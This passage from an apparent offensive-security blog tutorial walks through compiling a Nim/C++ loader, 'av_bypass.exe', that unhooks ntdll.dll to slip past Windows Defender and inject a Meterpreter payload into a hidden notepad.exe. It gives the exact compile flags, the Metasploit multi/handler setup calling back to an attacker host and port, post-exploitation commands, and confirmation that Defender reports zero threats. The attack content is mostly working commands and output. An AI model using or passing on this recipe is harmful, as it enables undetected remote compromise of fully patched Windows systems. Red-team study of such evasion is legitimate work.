![](/images/nim_proc_inject_pt1/42. compile1.png)

This should start a Powershell prompt within Visual Studio Code at the bottom of the window as shown below.  

![](/images/nim_proc_inject_pt1/43. compile2.png)

In this Powershell terminal, we will issue our compiler command to build our executable.  With our av_bypass.nim file a barebones nim compiler command looks like this:

    nim c -d:mingw --cpu:amd64 av_bypass.nim

Where:

nim c  :  C compiler command.

-d:mingw  :  Defines mingw as the compiler to use.

--cpu:amd64  :  Specifies 64-bit architecture.

av_bypass.nim  :  Nim file to compile into an executable.

If we executed this compile command on our av_bypass.nim file, it would not work.  For starters, we use C++ code in our Nim file so the C compiler command is not the right one.  Running "nim --help" shows us some options, but offers a "--fullhelp" option which provides much more detail.  

    nim --fullhelp

![](/images/nim_proc_inject_pt1/44. compile3.png)
output trimmed

Here we see a "cpp" option to use for C++ code, so now our compile command is :

    nim cpp "c:\projects\av_bypass.nim"

However if we execute this command, we do not succeed and receive the following error:

![](/images/nim_proc_inject_pt1/45. compile4.png)

The "ld returned 1 exit status" is part of the linking portion of compilation.  It failed due to:  undefined reference to `GetModuleInformation'

In searching, I found this module is part of the lpsapi.h header file in our C++ code.  This error occurs when we fail to pass along a proper option to include lpsapi.  This can be fixed with the option:  --passl=-lpsapi 
So our compile command is now:

    nim cpp --passl=-lpsapi "c:\projects\av_bypass.nim"

![](/images/nim_proc_inject_pt1/46. compile5.png)

This time we succeed and on my machine the av_bypass.exe file is 469KB.  

![](/images/nim_proc_inject_pt1/47. compile6.png)

Transfer the av_bypass.exe file over to your Victim Machine and attempt to execute it.  We do not receive a Meterpreter shell and instead receive two System Error messages, one after the other:

![](/images/nim_proc_inject_pt1/48. compile7.png)

These error messages indicate missing libraries our program requires.  There are two possible solutions:

-1- Transfer the .dll files over to the Victim Machine into the same folder as our av_bypass.exe file.
    - While this approach will work in our lab, it is not ideal and requires extra steps during the attack. 

-2- Statically link the .dll files into our executable at compile time.
    - This makes a standalone .exe file which should be able to run on any x64 Windows 10 machine.  The tradeoff is our file size is larger.

Fortunately, just like we did with the psapi.h file, there is a --passl= option to tell the linker (ld.exe) to statically link these two files into our program at compile time:

--passl=-static-libstdc++  :  Tell the linker to statically link libstdc++-6.dll.

--passl=-static-libgcc  :  Tell the linker to statically link libgcc_s_seh-1.dll.

So, our updated compile command becomes:

    nim cpp --passl=-lpsapi --passl=-static-libstdc++ --passl=-static-libgcc "c:\projects\av_bypass.nim"

![](/images/nim_proc_inject_pt1/49. compile8.png)

Which results in our new av_bypass.exe program with the expected increase in file size.  Transfer the file over to your Victim Machine and execute it. 

![](/images/nim_proc_inject_pt1/50. compile9.png)

We receive a new error, indicating a third .dll file is missing:  libwinpthread-1.dll.  The solution is to add another --passl= option in our compile command, but this one is slightly different.  libstdc++ and libgcc are so common they have their own shortcut argument.  You can see this by attempting to add --passl=-static-lpthread to your compile command.  You should receive the following error:  

![](/images/nim_proc_inject_pt1/51. compile10.png)

Instead, for libwinpthread-1.dll we need to add --passl="-static -lpthread".  So our updated compile command becomes: 

    nim cpp --passl=-lpsapi --passl=-static-libstdc++ --passl=-static-libgcc --passl="-static -lpthread" "c:\projects\av_bypass.nim"

![](/images/nim_proc_inject_pt1/52. compile11.png)

Again, our av_bypass.exe compiles successfully, with a larger file size.  Transfer the file to your Victim Machine and execute it.  You may see a quick pop-up but otherwise, nothing seems to happen.  Open a Task Manager window, and you can see a notepad.exe is running, but does not appear anywhere else on your screen.

![](/images/nim_proc_inject_pt1/53. compile12.png)

This means our program started the notepad.exe process in the background.  It also means our shellcode likely executed without major issue as the notepad.exe process is still running and did not crash.  Our next step would be to set up our Attacker Machine to receive the Meterpreter shell.  But first, a few additions to our compiler command to reduce the resulting file size.

From the Offensive Nim Github repository and the Nim FAQ page https://nim-lang.org/faq.html , we can use additional options to speed up the executable and reduce its size:

-d:danger  :  From the Nim FAQ: "-d:danger makes the fastest binary possible while disabling all runtime safety checks including bound checks, overflow checks, nil checks and more."

-d:strip  :  Used to make the smallest executable.

--opt:size  :  Used to make the smallest executable.

--passc=-flto  :  Tell the compiler to enable link-time optimization to make the executable faster.


So our final compile command in the Visual Studio Code terminal:

    nim cpp -d:danger -d:strip --opt:size --passc=-flto --passl=-lpsapi --passl=-static-libstdc++ --passl=-static-libgcc --passl="-static -lpthread" "c:\projects\av_bypass.nim"

nim.exe cpp  :  C++ compiler command.

-d:danger  :  From the Nim FAQ: "-d:danger makes the fastest binary possible while disabling all runtime safety checks including bound checks, overflow checks, nil checks and more."

-d:strip  :  Used to make the smallest executable.

--opt:size  :  Used to make the smallest executable.

--passc=-flto  :  Tell the compiler to enable link-time optimization to make the executable faster.

--passl=-lpsapi  :  Tell the linker to include psapi.

--passl=-static-libstdc++  :  Tell the linker to statically link libstdc++-6.dll.

--passl=-static-libgcc  :  Tell the linker to statically link libgcc_s_seh-1.dll.

--passl="-static -lpthread"  :  Tell the linker to statically link libwinpthread-1.dll.
"c:\projects\av_bypass.nim"  :  The .nim file to compile.

![](/images/nim_proc_inject_pt1/54. compile13.png)

Which results in a .exe file 1,196KB in size, a reduction of approximately 60%.  

![](/images/nim_proc_inject_pt1/55. compile14.png)

We are ready to move on.


<p>&nbsp;</p>
=======================================================

## Section 6:  Execution

=======================================================


Development Machine:  First, we transfer the newest av_bypass.exe file over to our Victim Machine.  Use whatever method works for you.

Attacker Machine:  On our Attacker Machine we need to start and configure Metasploit to receive the Meterpreter reverse shell.  Depending on your setup, your prompts and the output may look different than what is shown in the following screenshots.

    msfconsole

![](/images/nim_proc_inject_pt1/56. msfconsole.png)

    ifconfig

![](/images/nim_proc_inject_pt1/57. ifconfig.png)

Here we need to note your interface with access to the same network as the Victim Machine.  Mine is interface eth0 with IP address 192.168.3.28, which is the IP address we used earlier in our msfvenom command.  

The listener we will use to receive our Meterpreter reverse connection is Metasploit's built in multi/handler:

    use multi/handler
    
    show options

![](/images/nim_proc_inject_pt1/58. multi_handler1.png)

Here we see the payload defaults to "generic/shell_reverse_tcp" and the LHOST and LPORT are set to default.  We need to input these options so they will work with our payload:

    set payload windows/x64/meterpreter_reverse_tcp  [non-staged]
    
    set lhost eth0
    
    set lport 1701
    
    show options   

![](/images/nim_proc_inject_pt1/59. multi_handler2.png)

Here we have set the payload we expect to receive to the same as our msfvenom command.  We also set the listener to the matching interface and port on our Attacker Machine, confirmed by the ifconfig from a few steps ago.  We are now ready to run the listener:

    exploit -j

![](/images/nim_proc_inject_pt1/60. exploit-j.png)


With our Attacker Machine configured and listening for the connection, we can move back to the Victim Machine.


Victim Machine:  Ensure windows defender is turned on.  In your Windows search bar, search for "Windows Security".

![](/images/nim_proc_inject_pt1/61. defender1.png)

![](/images/nim_proc_inject_pt1/62. defender2.png)

As shown above, I left Automatic sample submission off, just in case.  This is a personal preference while working on projects like this.  You can turn it on if you wish.  It should not affect the ability to detect malicious software, only the automatic handling of a subset of detections without user intervention.

When ready, double-click av_bypass.exe.  You may see a quick pop-up flash on the screen.  Check your Attacker Machine.


Attacker Machine:

You should see a Meterpreter connection message similar to the below, with the IP addresses and port for your setup.  If all went well you should also not receive warnings or threat detection messages from Windows Defender on the Victim Machine:

![](/images/nim_proc_inject_pt1/63. meterpreter.png)

Let's interact with our Meterpreter session and confirm:

    sessions -i 1
    
    getuid
    
    sysinfo

![](/images/nim_proc_inject_pt1/64. getuid.png)

Success!  We have a functional Meterpreter session on the Windows 10 machine.  To further test, we can run the "shell" command to drop to a local cmd prompt:

    shell
    
    whoami && hostname

![](/images/nim_proc_inject_pt1/65. shell.png)

    systeminfo

![](/images/nim_proc_inject_pt1/66. systeminfo1.png)

output trimmed

![](/images/nim_proc_inject_pt1/67. systeminfo2.png) 
 
And here we have additional confirmation we are running on the intended machine, with all current patches/hotfixes installed.

But, how stealthy is our connection?  The answer:  not very.  

Back on our Victim Machine, we can take a look at the Task Manager, specifically on the Details tab.  Here we can see the notepad.exe process running as PID 6744 (your PID will be different), even though it is not visible on our Windows Victim Machine:

![](/images/nim_proc_inject_pt1/68. task_manager1.png)


If we open a new notepad.exe as a normal user might, we can compare the two processes.  In the below screenshot our process-injected notepad.exe remains as PID 6744 while the user initiated/normal notepad.exe is PID 6240.  For this screenshot, I had compiled av_bypass.exe with the process injection code as merely starting "notepad.exe" and you can immediately see the difference on the Command line column.  This is why we changed the code to execute "C:\\Windows\\system32\\notepad.exe" instead:

![](/images/nim_proc_inject_pt1/69. task_manager2.png)

If you made the changes along with the guide, then the only difference you may see is the Command line column for our process-injected notepad.exe does not have the double quotation marks.  While this is still an anomaly, it is less so than what is shown above.

![](/images/nim_proc_inject_pt1/70. task_manager3.png)

Another noticeable difference is our process-injected notepad.exe has a Job object ID, along with two other running processes.  In the above image, the three processes with Job object ID 736 are associated with our Meterpreter session and the cmd.exe spawned when we entered the command "shell".  Normal notepad.exe does not have a Job object ID or other processes associated with it.

![](/images/nim_proc_inject_pt1/71. task_manager4.png)

Here we see more activity in the I/O other columns, which includes networking.  All of the network traffic running through Meterpreter is tallied here, and the total of 478,222 bytes was merely after a handful of simple commands.

Before we leave our Victim Machine, navigate to the folder with your av_bypass.exe file, right-click it and choose "Scan with Microsoft Defender".

![](/images/nim_proc_inject_pt1/72. task_manager5.png)

You should receive the above results showing 0 threats found.

Back on our Attacker Machine, we can also take a quick look at our av_bypass.exe.  Move a copy of it to your Attacker Machine and execute a strings command:

    strings av_bypass.exe > strings.out
    
    gedit strings.out

![](/images/nim_proc_inject_pt1/73. strings1.png)

trimmed

![](/images/nim_proc_inject_pt1/74. strings2.png)

While much of the strings are obfuscated, here we see two separate sections with plaintext indicators that our .exe file is malicious.  Some of this can be obfuscated or removed from our code before compiling, but even with suspicious strings still present in plaintext in our executable, Windows Defender misses this malicious executable both in a static scan and during execution.


<p>&nbsp;</p>
=======================================================

## Section 7:  Part 1 Conclusion

=======================================================

In closing, we successfully built and executed a Meterpreter reverse shell without detection on a fully patched Windows 10 machine with Windows Defender turned on and up to date.  We did this by first setting up our Development Machine with the needed software.  We then used a combination of Nim and C++ code which evaded Windows Defender detection by loading a second copy of ntdll.dll at runtime.  This unmonitored copy of ntdll.dll loads without Windows Defender's hooks which permits use of Windows API procedures to inject a Meterpreter payload into a spawned and suspended instance of Notepad.exe. 

As noted earlier, the code produced here contains several plaintext artifacts that indicate our program is malicious.  The process injection technique used is basic, and would otherwise be considered ‘loud’ had we not unhooked ntdll.dll.  Since Microsoft constantly update their methods and signatures for detection, I do not expect this technique to remain undetected for long.  But at that point we'll have some new techniques to discover and update our code.  In Part 2 of this post, we will cover the Nim and C++ code more in depth as well as a look at the Windows API functions used to execute the injection and bypass. 

<p>&nbsp;</p>
=======================================================

## Section 8:  Troubleshooting

=======================================================

I ran into several errors along the way while initially working through this project.  Below are the main ones I encountered, all of which should be avoided if you followed the walkthrough, but I believe documenting 'what did not work' can be just as important as what did work.  This list is by no means exhaustive so if you run into other errors along the way, Google is your best friend.

### Compile-time Errors and Troubleshooting:

-1-  Errors related to gcc not being found.

Solution:  Ensure Mingw is in your path. If you need to, you can add it temporarily in the Visual Studio Code terminal by running:  $env:Path += ';C:\<path to ming>\mingw64\bin'.  Otherwise, you can re-run "finish.exe" and it will add Mingw to your path permanently if it is not present.

-2-  "nimbase.h:542:47: error: static assertion failed"

Solution:  The key words here are "static assertion failed".  This indicates a compiler issue with Mingw.  I had to delete the Mingw I downloaded direct from the Mingw website and then download the Mingw compiler directly from the Nim download page.  Once downloaded, I ran ‘finish.exe’ again to add the new Mingw directory to my path.

-3-  Errors related to "GetModuleInformation".

Solution:  The psapi.h header file is not getting linked properly in your compile command.  This is solved in our compiler command with one of the --passl= options :

--passl=-lpsapi  :  Tell the linker to include psapi.

http://mingw.5.n7.nabble.com/Problem-using-lt-psapi-h-gt-td20642.html

https://stackoverflow.com/questions/55637441/getmoduleinformation-fails-on-linkage-in-windows-10

### Run-time Errors and Troubleshooting:

-1-  "The code execution cannot proceed because <dll-name.dll> was not found."

Solution 1:  Place the <dll-name.dll> file in the same directory as the .exe file you are running.  This means you need to upload additional files to the target, but keeps the size of the final .exe file as small as possible.

Solution 2:  Statically link the .dll files at compile time to make a standalone executable.  The final .exe will be larger, but should run on any Windows 10 machine of the same version.  In the walkthrough we accomplishe this with the following options on our compile command:

--passl=-static-libstdc++  :  Tell the linker to statically link libstdc++-6.dll.

--passl=-static-libgcc  :  Tell the linker to statically link libgcc_s_seh-1.dll.

--passl="-static -lpthread"  :  Tell the linker to statically link libwinpthread-1.dll.

https://stackoverflow.com/questions/13768515/how-to-do-static-linking-of-libwinpthread-1-dll-in-mingw


<p>&nbsp;</p>
=======================================================

## Section 9:  References

=======================================================

-1- https://huskyhacks.dev/2021/07/17/nim-exploit-dev/  :  Original article that inspired me to try Nim and this process injection project.  Provided instructions are also for setting up the dev environment on Linux.  The techniques used here are loud and flagged immediately by A/V, but form the basis of what we do in this guide.

-2- https://github.com/byt3bl33d3r/OffensiveNim  :  Used two of the files from this awesome repository within the code for what we do here:  shellcode_bin.nim and clr_host_cpp_embed_bin.nim

-3- https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/  :  Provided the example code to load a fresh copy of ntdll.dll to avoid Windows Defender hooks on procedure calls.  There are many other techniques described in this post worth exploring.

-4- https://www.ired.team/offensive-security/defense-evasion/how-to-unhook-a-dll-using-c++  :  Link stolen from the above EDR-bypass post. 

-5- https://nim-lang.org/faq.html  :  Assisted with compiler optimization commands and general Nim topics since this was my first use of Nim.

-6- https://github.com/khchen/winim  :  This is a Nim library available on Github.  Though briefly mentioned in the post, this repository opens up the world of Windows API for Nim coders.  The readme.md puts it best:  "Winim contains Windows API, struct, and constant definitions for Nim. The definitions are translated from MinGW's Windows headers and Windows 10 SDK headers."

-7- https://docs.microsoft.com/en-us/windows/win32/api/  :  Reference documentation for Windows API.

-8- https://git-scm.com/download/win  :  Git download page for Windows

-9- https://code.visualstudio.com/download  :  Visual Studio Code download page

-10- https://nim-lang.org/install_windows.html  :  Nim download page for Windows

<p>&nbsp;</p>
=======================================================

![rax logo](/images/rax_intel.png)

<p>&nbsp;</p>
